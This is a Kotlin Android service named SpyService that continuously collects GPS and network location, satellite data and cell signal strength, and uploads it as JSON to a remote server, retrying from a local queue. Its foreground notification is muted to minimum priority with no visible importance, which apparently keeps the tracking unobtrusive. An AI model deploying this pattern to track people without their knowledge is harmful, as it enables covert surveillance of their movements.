package com.kas.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.location.GnssStatus
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationCompat.PRIORITY_MIN
import com.google.gson.Gson
import com.kas.app.App.Companion.secureId
import com.kas.app.App.Companion.tag
import com.kas.app.model.Config
import com.kas.app.model.Gps
import com.kas.app.repository.remote.RepositoryRemoteImpl
import com.kas.app.room.LocPhoneGpsStatesEntity
import java.io.IOException


class SpyService : Service() {

    private val myThread = MyThread()
    private var serviceWorks = false
    private var senderWork = false

    private val channelId = "my_service"

    private var newTask: LocPhoneGpsStatesEntity? = null
    private var oldTask: LocPhoneGpsStatesEntity? = null

    private var satelliteCount = 0
    private var avgSnr = 0f

    private var usedSatellites = 0

    private val dao = Database.getDao()

    private var locationManager =
        (App.instance.getSystemService(LOCATION_SERVICE) as LocationManager)

    private val repo = RepositoryRemoteImpl(locationManager)


    private val locationListener: LocationListener = object : LocationListener {

        override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {
            repo.postData(provider, callbackNewTask, "$status")
        }

        override fun onProviderEnabled(provider: String) {
            repo.postData(provider, callbackNewTask, "onProviderEnabled")
        }

        override fun onProviderDisabled(provider: String) {
            repo.postData(provider, callbackNewTask, "onProviderDisabled")
        }

        override fun onLocationChanged(location: Location) {
            locationChanged(location)
        }
    }

    private fun locationChanged(loc: Location) {

        val signalStrength = MyPhoneStateListener.getSignalStrength()
        val provider = loc.provider == LocationManager.GPS_PROVIDER

        val locPhoneGpsStatesEntity = LocPhoneGpsStatesEntity(
            0, System.currentTimeMillis() / 1000, loc.latitude, loc.longitude,
            usedSatellites, avgSnr, satelliteCount, provider, secureId = secureId
        )
        signalStrength?.let {
            locPhoneGpsStatesEntity.apply {
                level = it.level
                asuLevel = it.asuLevel
                dbm = it.dbm
            }
        }
        locPhoneGpsStatesEntity.let {
            newTask = it
            repo.post(callbackNewTask, Gson().toJson(it))
        }

    }

    private fun handleEvent(lc: LocPhoneGpsStatesEntity) {
        dao?.insert(lc)
        if (!senderWork) {
            initSender()
        }

    }

    private fun initSender() {
        senderWork = true
        var tasks = dao.getAllTasks()
        if (tasks.isNotEmpty()) {
            while (tasks.isNotEmpty()) {
                for (task in tasks) {
                    oldTask = task
                    repo.post(callbackOldTasks, Gson().toJson(task))
                }
                Thread.sleep(5000)
                Log.d(tag, "\n")
                tasks = dao.getAllTasks().toMutableList()
                Log.d(tag, "${tasks.size}")
            }
        }
        senderWork = false
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        if (secureId == "") {
            intent?.extras?.getString("secureId")?.let {
                Config.updateSecureId(it)
            }
        }

        if (!serviceWorks) {
            initComponents()
            (this.getSystemService(LOCATION_SERVICE) as LocationManager).let {
                repo.post(callbackNewTask,
                    Gson().toJson(LocPhoneGpsStatesEntity(
                        Time = System.currentTimeMillis() / 1000,
                        message = "ACCESS_BACKGROUND_LOCATION PERMISSION_GRANTED")))
                locationManager = it
                listenersRegistration(it.allProviders)
                serviceWorks = true
                Log.d(tag, "147")
            }
        } else {
            Log.d(tag, "150")
            checkTasks()
        }
        return START_STICKY
    }

    private fun initComponents() {
        Database.init(this)
        MyPhoneStateListener.init(this)
        checkTasks()
    }


    private fun callNotification() {
        createNotificationChannel()
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
        val notification = notificationBuilder.setOngoing(true)
            .setSmallIcon(R.mipmap.ic_launcher_foreground)
            .setPriority(PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
        startForeground(101, notification)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(channelId,
            "My Background Service", NotificationManager.IMPORTANCE_NONE).apply {
            lightColor = Color.BLUE
            lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        }
        channel.lightColor = Color.BLUE
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        service.createNotificationChannel(channel)
    }

    private fun checkTasks() {
        Thread {
            dao?.let {
                if (it.count() > 0) {
                    if (!senderWork) {
                        initSender()
                    } else {
                        Log.d(tag, "193")
                    }
                } else {
                    Log.d(tag, "193")
                }
            }
        }.start()
    }


    override fun onCreate() {
//        val myThread = MyThread()
        myThread.start()
        callNotification()
    }

    @SuppressLint("MissingPermission", "NewApi")
    private fun listenersRegistration(providers: MutableList<String>) {

        Gps(locationManager, locationListener, mGnssStatusCallback, myThread).let {
            if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
                it.requestLocationUpdates(LocationManager.NETWORK_PROVIDER)
            }
            if (providers.contains(LocationManager.GPS_PROVIDER)) {
                it.requestLocationUpdates(LocationManager.GPS_PROVIDER)
            }
        }
    }

    private val mGnssStatusCallback = object : GnssStatus.Callback() {

        override fun onSatelliteStatusChanged(status: GnssStatus) {
            satelliteCount = status.satelliteCount
            usedSatellites = 0
            var totalSnr = 0f
            for (i in 0 until satelliteCount) {
                if (status.usedInFix(i)) {
                    usedSatellites++
                    totalSnr += status.getCn0DbHz(i)
                }
            }
            avgSnr = if (totalSnr > 0) {
                totalSnr
            } else {
                0.0f
            }
        }

    }

    private val callbackNewTask = object : okhttp3.Callback {

        override fun onFailure(call: okhttp3.Call, e: IOException) {
            newTask?.let {
                handleEvent(it)
            }
        }

        override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
            if (!response.isSuccessful) {
                newTask?.let {
                    dao?.insert(it)
                }
            }
            response.body?.close()
        }
    }

    private val callbackOldTasks = object : okhttp3.Callback {

        override fun onFailure(call: okhttp3.Call, e: IOException) {
            println()
        }

        override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
            if (response.isSuccessful) {
                oldTask?.let {
                    dao.delete(it)
                }
            }
            response.body?.close()
        }
    }

    class MyThread : Thread() {
        lateinit var handler: Handler
        override fun run() {
            Looper.prepare()
            Looper.myLooper()?.let {
                handler = Handler(it)
            }
//            handler = Handler(Looper.getMainLooper())
            Looper.loop()
        }

    }

}